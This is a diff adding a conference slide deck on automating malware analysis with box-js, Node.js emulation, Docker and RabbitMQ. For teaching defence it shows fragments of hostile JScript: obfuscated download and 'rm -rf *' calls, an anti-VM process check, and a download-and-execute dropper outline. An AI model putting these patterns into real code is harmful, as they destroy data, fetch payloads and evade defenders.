@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="author" content="CapacitorSet"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><link rel="stylesheet" href="../common/css/reveal.css"><link id="theme" rel="stylesheet" href="../common/css/theme/white.css"><link rel="stylesheet" href="../common/lib/css/monokai-sublime.css"><style>tt {
+	font-family: monospace !important;
+}
+.pro {
+	color: #43a047; // Material green 600
+}
+.contro {
+	color: #e53935; // Material red 600
+}
+</style><title>Automating malware analysis with Node.js, Docker and RabbitMQ</title></head><body><div class="reveal"><div class="slides"><section><section id="title"><h3>Automating malware analysis with Node.js, Docker and RabbitMQ</h3><hr><p>@CapacitorSet</p></section></section><section><p>These slides were presented at <a href="http://endsummercamp.org/">ESC17</a> in Venice. They give an overview of how box-js works and what niche it fills.</p><p>Attenton: many slides continue to the bottom, not to the right.</p><p>Some slides include "speaker notes" (personal notes not shown to the public), which will appear in a grey box.</p><aside class="notes">Speaker notes here</aside></section><section><aside class="notes">Typical scenario: social engineering. The infection has multiple stages. It can be prevented in many ways: we are interested in the dropper.</aside><div style="display: flex;"><div style="flex: 0 0 70%;"><img src="../common/img/thunderbird.png"></div><div style="flex: 1;"><ul><li class="fragment">First stage: <tt>UPS invoice.js</tt></li><li class="fragment">The user opens the file, which downloads...</li><li class="fragment">Second stage: <tt>locky.exe</tt></li></ul></div></div></section><section><section><ol><li><strong>Manual reverse engineering</strong></li><li>VM analysis</li><li>Emulation</li></ol><aside class="notes">There are many possible approaches. [Continues below]</aside></section><section><aside class="notes">Diversion against antivirus heuristics and against manual analysis</aside><p>Original code: it's there, but we can't read it</p><img src="../common/img/ugly.png"></section><section><p>Formatted code</p><img src="../common/img/beautify.png"></section><section><h3>Obfuscation</h3><p>Equivalent, but unreadable code</p><style>.striped td {
+	border: 1px black solid !important;
+}
+.striped tr {
+	background-color: #eee;
+}
+.striped tr:nth-child(even) {
+	background-color: #ccc;
+}</style><table class="striped" style="font-size: 26px; border: 2px black solid;"><tr><td><tt>download("http://malware.ru/")</tt></td><td><tt>download(base64decode("..."))</tt></td><td>Use of encodings</td></tr><tr><td><tt>beEvil();</tt></td><td><tt>code = decrypt("..."); eval(code)</tt></td><td>Use of cryptography (XOR)</td></tr><tr><td><tt>shell.Execute("rm -rf *");</tt></td><td><tt>things = ["rm&nbsp;-rf&nbsp;*",&nbsp;"Execute"]; shell[things[1]](things[0]);</tt></td><td>Constants &rarr; variables in an array</td></tr><!--trtd: tt if (HTTPstatus == 200) success();
+td: tt HTTPstatus == 0xC8 && success();
+td Trasformazione dei costrutti--></table><aside class="notes">The two versions are <u>functionally equivalent</u>, but one is less readable</aside></section><section><h3>Final result</h3><img src="../common/img/clean.png"></section><section><strong>Algorithm</strong><br><ol><li><tt>listaUrl = [20 URL...</tt>]</li><li>For each element of <tt>listaUrl</tt>:</li><ol><li>Do a GET request</li><li>If the response is not OK (404 not found, unreachable, etc.), go to the next</li><li>If the response is not an executable, go to the next</li><li>Save the response to <tt>%TEMP%/randomname.exe</tt></li><li>Execute the file</li></ol></ol></section><section><ul><div class="pro"><li>Accurate understanding</li></div><div class="contro"><li>15 minutes to 1 hour</li><li>Requires a deep knowledge of JScript</li></div></ul></section></section><section><section><ol><li>Manual reverse engineering</li><li><strong>VM analysis</strong></li><li>Emulation</li></ol></section><section><img src="diagrams/VM_stack.svg"><br><i>Virtualizing Windows</i></section><section><h3>Monitoring</h3><ul><aside class="notes">API Windows: through interception "I detect every interaction"</aside><li>Intercepting Windows API calls<ul><li>reading the system registry</li><li>creating new processes</li><li>...</li></ul></li><li>Memory monitoring</li><li>Disk activity monitoring</li><li>Network monitoring (DNS, downloads, etc)</li></ul></section><section><h3>Problems</h3><p>Malware has measures against automated analysis:</p><ul><li>Make sure not to be in a VM</li><li>Check for monitoring processes</li></ul><pre><code class="js">processList = GetObject("WinMgmts:").InstancesOf("Win32_Process")
+isVM = false;
+for (i = 0; i < processList.length; i++) {
+	if (processList[i] == "Wireshark.exe") isVM = true;
+	if (processList[i] == "OllyDbg.exe") isVM = true;
+	if (processList[i] == "...") isVM = true;
+}
+if (!isVM) {
+	// ...
+}</code></pre></section><section><h3>Results</h3><ol><li>Connecting to sito1.com... timeout.</li><li>Connecting to sito2.it... connected.<small class="contro">Con: not every URL is detected!</small></li><li>Downloaded http://sito2.it/locky.exe</li><li>Saved C:\TEMP\locky.exe</li><li>Executed C:\TEMP\locky.exe<small class="pro">Pro: we also analyse the actual virus</small></li><li>locky.exe encrypted the file Desktop\photo.jpg</li><li>...</li></ol></section><section><div style="text-align: left;"><ul><div class="pro"><li><i>Fast</i>: 2-3 minutes, 100% automated</li><li>Analyses both the dropper and the virus</li></div><div class="contro"><li>1-2 GB RAM, >50 GB HDD</li><li>Opaque method, hard to debug</li></div></ul></div><aside class="notes">Opaque because I can't easily change how the interpret works</aside></section></section><section><section><ol><li>Manual reverse engineering</li><li>VM analysis</li><li><strong>Emulation</strong></li></ol></section><section><table><tr><td><img src="diagrams/VM_stack.svg" style="opacity: 0.5;"></td><td><img src="diagrams/Box_stack.svg"></td></tr><tr><td style="text-align: center;"><del>Virtualizing Windows</del></td><td style="text-align: center;"><em>Emulating</em> the Javascript environment</td></tr></table><div style="display: flex;"><div style="flex: 0 0 40%;"><br></div><div style="flex: 0 0 60%;"></div></div></section><section><p>Microsoft JScript is a JavaScript <u>dialect</u></p><p>Any JavaScript engine can run JScript, with modifications</p><div class="fragment"><p>Which engine? <strong>Node.js</strong> (V8). Developed by Google, works on the command line, same engine as Chrome</p></div></section><section><h4>ActiveX libraries</h4><img src="diagrams/ActiveX.svg" style="border: 0;"><p>We want to create "fake" libraries, that emulate the real ones and capture informations</p><aside class="notes">= <u>trick</u> the sample into believing ActiveX works correctly</aside></section><style>.rootCall {
+	color: #e53935;
+}
+.rewriteCall {
+	color: #ffb300;
+}
+.argument {
+	color: #7cb342;
+}</style><section><h3>Stubs</h3><p>Fictitious versions (<i>stub</i>) of the ActiveX components we are interested in</p><p>They seem to work correctly, but log interactions:</p><pre><code class="js" style="width: 900px;">class XMLHTTP {
+	download(url) {
+		headers["User-Agent"] = "Internet Explorer 6.0";
+		print(`New request to ${url}`);
+		output = request("GET", url);
+		print(`I downloaded ${output.length} byte.`);
+		print("File type: " + identify(output));
+		return output;
+	}
+}</code></pre></section><section><h3>AST rewriting</h3><p>We dissect the code and add new nodes</p><div style="display: flex;"><div style="flex: 0 0 50%;"><img src="diagrams/vanilla_AST.dot.svg"><code><span class="rootCall">eval</span>(<span class="argument">foobar.decrypt() + "unknown code"</span>)</code></div><div class="fragment" style="flex: 0 0 20%;"><img src="diagrams/rewritten_AST.dot.svg"><code> <span class="rootCall">eval</span>(<span class="rewriteCall">rewrite</span>(<span class="argument">foobar.decrypt() + "unknown code"</span>))</code></div></div><aside class="notes">It's an easier way to manipulate code</aside></section><section><strong>Results</strong><br><ol><li><tt>listaUrl = [20 URL...</tt>]</li><li>For each element of <tt>listaUrl</tt>:</li><ol><li>Do a GET request<br><small>Offline analysis</small></li><li>If the response is not ok (404 not found, unreachable, etc.) go to the next</li><li>If the response is not an executable, go to the next</li><li>Save the response to <tt>%TEMP%/randomname.exe</tt></li><li>Execute the file</li></ol></ol></section><section><ul><div class="pro"><li><i>Very fast</i>: 5 to 90 seconds</li><li>Tiny footprint: ~50 MB RAM</li><li>More flexible &rarr; more powerful</li><li>Easy to debug</li></div><div class="contro"><li>Requires patches/bugfixes</li><li>Might require human intervention</li></div></ul><aside class="notes">Requires patches because it involves a rewrite of ActiveX, which is bound to be buggy</aside></section></section><section><i>demo</i><hr><p>Note for the reader: in this phase I open a shell, run a command to analyze a sample, and go through the output of box-js. In particular, I try both the offline analysis and passing --download, where I show that the second stage is downloaded correctly, and finally I upload the second stage to VirusTotal and verify that it is malicious.</p></section><section><section><p>In practice:</p><h2>Malware analysis pipeline</h2><img src="diagrams/Pipeline.svg" style="border: 0;"></section><section><p>We need an isolated, easily-reproducible environment</p><p>We use<strong>Docker</strong> containers: isolated from the host, instanced in a single command:</p><pre><code class="bash">docker run CapacitorSet/box-js     \ # Image name
+    --volume ~/sample.js:/samples/ \ # Shared folders
+    --env "QUEUE_IP=172.17.0.1"      # Environment variables</code></pre></section><section><p>We need to put samples to be analyzed in a sample, and process them with several workers</p><p>We create a <i>work queue</i> with <strong>RabbitMQ</strong></p><img src="../common/img/queue.gif"><p>Easily scalable approach: we can add and remove workers at will</p></section><section><h3>Applications</h3><p>Typical scenario: malware analysis researcher/company</p><p>The user quickly extracts the second stages, either as URLs or as files, and can analyze them with VirusTotal/Malwr/other sandboxes</p><br><p>In short: emulation simplifies and speeds up first-stage analysis, and results in more accurate analyses</p></section></section><section><h3 style="text-transform: none;">@CapacitorSet</h3><img style="border: 0;" src="../common/img/github.png"><p>My malware analysis project:</p><tt><a href="https://github.com/CapacitorSet/box-js">https://github.com/CapacitorSet/box-js</a></tt></section></div></div><script src="../common/lib/js/head.min.js"></script><script src="../common/js/reveal.min.js"></script><script>// More info https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+	controls: true,
+	progress: true,
+	history: true,
+	center: true,
+
+	transition: 'slide', // none/fade/slide/convex/concave/zoom
+	showNotes: true,
+
+	// More info https://github.com/hakimel/reveal.js#dependencies
+	dependencies: [
+		{ src: '../common/lib/js/classList.min.js', condition: function() { return !document.body.classList; } },
+		{ src: '../common/plugin/notes/notes.js', async: true },
+		{ src: '../common/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+	]
+});</script></body></html>
